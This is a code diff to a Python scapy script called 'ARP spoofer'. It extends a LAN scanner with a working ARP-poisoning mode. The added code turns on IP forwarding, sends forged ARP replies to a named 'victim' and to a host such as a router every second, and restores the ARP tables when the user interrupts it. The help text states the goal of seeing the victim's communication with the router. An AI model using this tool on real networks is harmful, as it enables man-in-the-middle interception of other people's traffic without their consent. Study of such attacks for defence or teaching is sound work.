@@ -1,5 +1,5 @@
 from scapy.all import Ether, ARP, srp, send
-import os, sys
+import os, sys, time
 import requests
 import pyfiglet, termcolor
 from datetime import datetime
@@ -29,9 +29,9 @@ def arp_scan(ip):
     request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)    
 
     # srp() sends ARP request AND wait for the response
-    ans, unans = srp(request, timeout=2, retry=1, verbose=0)
+    ans, _ = srp(request, timeout=2, retry=1, verbose=0)
     # Append ips, macs, and manufacturer in result list for those who responded
-    for sent, received in ans:
+    for _, received in ans:
         result.append({'IP': received.psrc, 'MAC': received.hwsrc, 'manu': show_manufacturer(received.hwsrc)})    
 
     return result
@@ -53,18 +53,80 @@ def show_manufacturer(mac):
     json = r.json()
     return json['result']['company']
 
+def enable_linux_iproute():
+    """Enables IP route (IP Forward) in Linux-based distro
+    """
+    file_path = "/proc/sys/net/ipv4/ip_forward"
+    is_forward = False
+    with open(file_path) as f:
+        if f.read() == 1:
+            is_forward = True
+            return
+    if not is_forward:
+        with open(file_path, "w") as f:
+            print(1, file=f)
+
+def get_mac(ip):
+    """Returns MAC address of any device connected to the network
+    Similar as arp_scan() but it returns directly MAC address and not a list with other informations 
+
+    Args:
+        ip (string): the ip of the victim
+    """
+    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)    
+    ans, _ = srp(request, timeout=2, retry=1, verbose=0)
+    if ans:
+        return ans[0][1].src
+
+def spoof(target_ip, host_ip):
+    """Spoofs `target_ip` saying that we are `host_ip`
+
+    Args:
+        target_ip (string): The ip's victim
+        host_ip (string): Your ip address
+    """
+    target_mac = get_mac(target_ip)
+    
+    # craft the arp 'is-at' operation packet, in other words: an ARP response
+    # 'hwsrc' is not specified as by default it is our MAC address
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
+    send(arp_response, verbose=0)
+    print(".", end=" ")
+
+def restore(target_ip, host_ip):
+    """Restores the normal process of a regular network
+    This is done by sending the original informations to `target_ip`
+
+    Args:
+        target_ip (string): The ip's victim
+        host_ip (string): The impersonate ip address
+    """
+    target_mac = get_mac(target_ip)
+    host_mac = get_mac(host_ip)
+
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
+
+    # we send each reply seven times for a good measure
+    send(arp_response, verbose=0, count=7)
+
 def show_help():
+    """Show documentation and usage about this script
+    """
     # Pyfiglet make some cool banner
     custom_fig = pyfiglet.Figlet(font='slant')
     print(custom_fig.renderText('ARP spoofer'))
     
     print(f"""
     Usage:
-        {os.path.basename(__file__)} -s <ip>
+        {os.path.basename(__file__)} -sc <ip>
+        {os.path.basename(__file__)} -sp <victim_ip> <host_to_impersonate>
 
     Options:
-        -s    Scan for a specific ip or a range of ip by specifying network's mask
-              Like 192.168.1.1 for a specific ip or 192.168.1.1/24 for a range of ip
+        -sc    Scan for a specific ip or a range of ip by specifying network's mask
+               Like 192.168.1.1 for a specific ip or 192.168.1.1/24 for a range of ip
+        
+        -sp    Impersonate a device (for example a router) and tell who you are to you
+               your victim in order to see its communication between your victim and router  
 
         -h    Show this screen
     """)
@@ -82,7 +144,7 @@ def main():
         show_help()
         sys.exit()
     
-    if "-s" in opts:
+    if "-sc" in opts:
         t1 = datetime.now()
         result = arp_scan(args[0])
 
@@ -101,6 +163,29 @@ def main():
             print(f.format(ip, mac, manufacturer))
         t2 = datetime.now()
         termcolor.cprint("Scanning Completed in " + str(t2-t1), "green")
+
+    elif "-sp" in opts:
+        if len(args) != 2:
+            show_help()
+            termcolor.cprint("You need to specify a target and a host ip", "red")
+            sys.exit()
+        else:
+            enable_linux_iproute()
+
+            target = args[0]
+            host = args[1]
+
+            try:
+                while True:
+                    # telling the `target` that we are the `host`
+                    spoof(target, host)
+                    # telling the `host` that we are the `target`
+                    spoof(host, target)
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                print("[!] Detected CTRL+C! Restoring the network, please wait...")
+                restore(target, host)
+                restore(host, target)
     else:
         raise SystemExit(show_help())
 
